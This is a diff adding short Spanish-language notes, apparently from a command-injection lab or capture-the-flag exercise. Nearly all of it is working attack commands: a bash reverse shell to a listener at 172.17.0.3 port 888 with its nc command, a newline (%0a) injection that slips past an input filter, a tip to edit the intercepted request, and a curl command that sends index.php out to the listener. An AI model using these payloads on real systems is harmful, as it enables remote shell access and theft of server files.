@@ -1,0 +1,13 @@
+Para la reverse shell original:
+|| sh -i >& /dev/tcp/172.17.0.3/888 0>&1                                       nc -nlp 888
+
+
+El segundo reto con filtro, requiere añadir el %0a para bypassear el filtro
+ponemos
+127.0.0.1 %0a curl http://172.17.0.3:888/
+
+En el formulario, inspeccionamos el paquete que sale, y editamos para que en vez de %250a haya un %0a
+
+Nos enviaría el contenido de index.php
+127.0.0.1 %0a curl --data-urlencode "content@index.php" http://172.17.0.3:888/
+
